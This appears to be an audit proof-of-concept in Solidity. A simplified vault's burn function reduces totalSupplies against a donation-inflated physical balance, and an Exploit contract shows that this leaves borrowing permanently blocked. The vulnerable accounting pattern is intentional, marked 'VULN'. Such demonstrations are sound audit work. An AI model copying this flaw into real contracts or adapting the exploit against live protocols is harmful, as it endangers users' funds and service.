// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VaultLogic {
    uint256 public totalSupplies;
    uint256 public totalBorrows;
    uint256 public physicalBalance;

    function seed(uint256 supply, uint256 borrows) external {
        totalSupplies = supply;
        totalBorrows = borrows;
        physicalBalance = supply;
    }

    function donate(uint256 amount) external {
        physicalBalance += amount; // direct ERC20 transfer is not reflected in totalSupplies
    }

    function burn(uint256 amountOut) external {
        require(physicalBalance >= amountOut, "insufficient physical balance");
        // @> VULN: $.totalSupplies[params.asset] -= params.amountOut;
        totalSupplies -= amountOut;
        physicalBalance -= amountOut;
    }

    function availableBalance() public view returns (uint256) {
        // The production code computes totalSupplies - totalBorrows; once the
        // invariant is broken, borrowing must be refused.
        if (totalSupplies <= totalBorrows) return 0;
        return totalSupplies - totalBorrows;
    }

    function maxBorrowable(uint256 requested) external view returns (uint256) {
        uint256 available = availableBalance();
        return available < requested ? available : requested;
    }
}

contract Exploit {
    VaultLogic public vault;
    bool public confirmed;

    constructor() {
        vault = new VaultLogic();
    }

    function run() external {
        vault.seed(100, 90);
        vault.donate(5);
        vault.burn(15);
        require(vault.totalSupplies() == 85, "accounting did not decrease");
        require(vault.totalBorrows() == 90, "borrow accounting changed");
        require(vault.physicalBalance() == 90, "physical balance mismatch");
        require(vault.maxBorrowable(10) == 0, "borrow path should be bricked");
        confirmed = true;
    }
}

